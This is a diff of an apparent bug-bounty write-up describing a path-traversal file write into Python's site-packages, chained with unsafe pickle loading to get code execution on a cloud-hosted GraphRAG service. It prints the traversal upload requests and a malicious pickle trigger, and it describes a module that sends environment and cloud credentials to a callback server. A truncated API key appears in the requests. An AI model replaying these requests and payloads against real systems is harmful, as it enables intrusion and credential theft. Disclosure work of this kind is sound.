@@ -174,8 +174,68 @@ Content-Type: application/json
       pair that made this dangerous: an upload, plus a traversal to put the upload anywhere I
       wanted.</p>
 
-      <p>The payload was a small Python module that grabs the container environment and the ECS
-      task role credentials and beacons them out to an external callback server.</p>
+      <p>To prove that, I uploaded a harmless marker file with a traversing filename and pointed
+      <code>project_path</code> at the installed package directory:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>POST /graphene/graph/load_datasources HTTP/1.1
+Host: REDACTED.aws.metafb.cloud
+X-API-Key: apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...
+Content-Type: multipart/form-data; boundary=----boundary
+
+------boundary
+Content-Disposition: form-data; name="project_path"
+
+/usr/local/lib/python3.11/site-packages/fast_graphrag
+------boundary
+Content-Disposition: form-data; name="files"; filename="../../h1_write_probe.txt"
+Content-Type: text/plain
+
+proof of arbitrary write
+------boundary--</code></pre>
+      </div>
+
+      <p>A normal upload would have been saved under <code>.../fast_graphrag/input/</code>. Instead
+      the server handed back the resolved path, and the <code>../../</code> had escaped two levels
+      up out of the <code>input/</code> folder:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>json</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>{
+  "status": "success",
+  "message": "Successfully loaded 1 files",
+  "files": [{
+    "filename": "../../h1_write_probe.txt",
+    "path": ".../fast_graphrag/input/../../h1_write_probe.txt"
+  }]
+}</code></pre>
+      </div>
+
+      <p>That resolves to
+      <code>/usr/local/lib/python3.11/site-packages/h1_write_probe.txt</code>, sitting in
+      <code>site-packages</code> rather than the folder it was supposed to stay in. So the
+      <code>filename</code> field was a clean arbitrary file write: I could drop a file anywhere the
+      app user could reach, including Python's module search path.</p>
+
+      <p>A file on disk is not code execution, though. Something on the server still had to load or
+      run whatever I wrote, and that was the harder half.</p>
+
+      <h2>Turning that write into code execution (the hard part)</h2>
+      <p>This is where I lost the most time. A file write is not code execution. A Python file can
+      sit in <code>site-packages</code> all day, but nothing runs it unless something on the server
+      actually imports or loads it. Getting from "files can be written" to "the code runs" took a
+      handful of attempts and a few hypotheses that went nowhere before one finally stuck.</p>
+      <p>The one that worked was the <code>/visualize</code> endpoint. It loads a file called
+      <code>graph_igraph_data.pklz</code> with <code>pickle.loads()</code>, with no signature
+      check, and the <code>dataset</code> parameter that decides which folder to read from is
+      itself path traversable. Unsafe pickle deserialization is a classic code execution primitive,
+      because pickle lets an object define what happens when it is unpickled.</p>
+
+      <p>That gave me the two pieces I needed. First, the actual payload: a small Python module,
+      dropped into <code>site-packages</code> through the same arbitrary write from before. It grabs
+      the process identity, the environment, and the cloud credentials and beacons them out, and it
+      runs the moment anything imports it:</p>
 
       <div class="code">
         <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>python · h1_rce_module4.py</span><button class="code__copy" type="button">copy</button></div>
@@ -210,8 +270,8 @@ except Exception as e:
     )</code></pre>
       </div>
 
-      <p>That module went up with a traversing filename so it lands directly in
-      <code>site-packages</code>:</p>
+      <p>It goes up through the same <code>load_datasources</code> write, this time as
+      <code>../../h1_rce_module4.py</code> so it lands directly in <code>site-packages</code>:</p>
 
       <div class="code">
         <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
@@ -228,44 +288,12 @@ Content-Disposition: form-data; name="project_path"
 Content-Disposition: form-data; name="files"; filename="../../h1_rce_module4.py"
 Content-Type: text/plain
 
-[module content]
+[module content above]
 ------boundary--</code></pre>
       </div>
 
-      <p>The server happily reported success and even handed me the resolved path back, which
-      confirmed the traversal worked:</p>
-
-      <div class="code">
-        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>json</span><button class="code__copy" type="button">copy</button></div>
-        <pre><code>{
-  "status": "success",
-  "message": "Successfully loaded 1 files",
-  "files": [{
-    "filename": "../../h1_rce_module4.py",
-    "path": ".../fast_graphrag/input/../../h1_rce_module4.py"
-  }]
-}</code></pre>
-      </div>
-
-      <p>That path collapses down to
-      <code>/usr/local/lib/python3.11/site-packages/h1_rce_module4.py</code>. My file was now
-      importable. But writing a file is not the same as running it. I needed something to actually
-      import it.</p>
-
-      <h2>Turning that write into code execution (the hard part)</h2>
-      <p>This is where I lost the most time. A file write is not code execution. A Python file can
-      sit in <code>site-packages</code> all day, but nothing runs it unless something on the server
-      actually imports or loads it. Getting from "files can be written" to "the code runs" took a
-      handful of attempts and a few hypotheses that went nowhere before one finally stuck.</p>
-      <p>The one that worked was the <code>/visualize</code> endpoint. It loads a file called
-      <code>graph_igraph_data.pklz</code> with <code>pickle.loads()</code>, with no signature
-      check, and the <code>dataset</code> parameter that decides which folder to read from is
-      itself path traversable. Unsafe pickle deserialization is a classic code execution primitive,
-      because pickle lets an object define what happens when it is unpickled.</p>
-
-      <p>The trigger was a tiny pickle whose only job on load is to import the module. Importing it
-      is what runs the beacon code above, because Python runs a module's top level the first time it
-      is imported.</p>
+      <p>Second, a tiny pickle whose only job on load is to import that module. Importing it runs the
+      module's top level, because Python runs a module's top level the first time it is imported:</p>
 
       <div class="code">
         <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>python</span><button class="code__copy" type="button">copy</button></div>
@@ -279,9 +307,31 @@ open("graph_igraph_data.pklz", "wb").write(gzip.compress(pickle.dumps(RCE())))
 # 75 bytes</code></pre>
       </div>
 
-      <p>That pickle went into the package directory (one level of traversal this time), and the
-      load fired by pointing the <code>dataset</code> parameter back up the tree into
-      <code>site-packages</code>:</p>
+      <p>That pickle gets written into the package directory itself (<code>fast_graphrag</code>
+      inside <code>site-packages</code>), one level of traversal up from <code>input/</code> this
+      time, which is exactly where <code>/visualize</code> loads its data from:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>POST /graphene/graph/load_datasources HTTP/1.1
+Host: REDACTED.aws.metafb.cloud
+X-API-Key: apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...
+Content-Type: multipart/form-data; boundary=----boundary
+
+------boundary
+Content-Disposition: form-data; name="project_path"
+
+/usr/local/lib/python3.11/site-packages/fast_graphrag
+------boundary
+Content-Disposition: form-data; name="files"; filename="../graph_igraph_data.pklz"
+Content-Type: application/octet-stream
+
+[gzipped pickle bytes]
+------boundary--</code></pre>
+      </div>
+
+      <p>With both files in place, the load fires by pointing the <code>dataset</code> parameter
+      back up the tree into <code>site-packages</code>:</p>
 
       <div class="code">
         <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
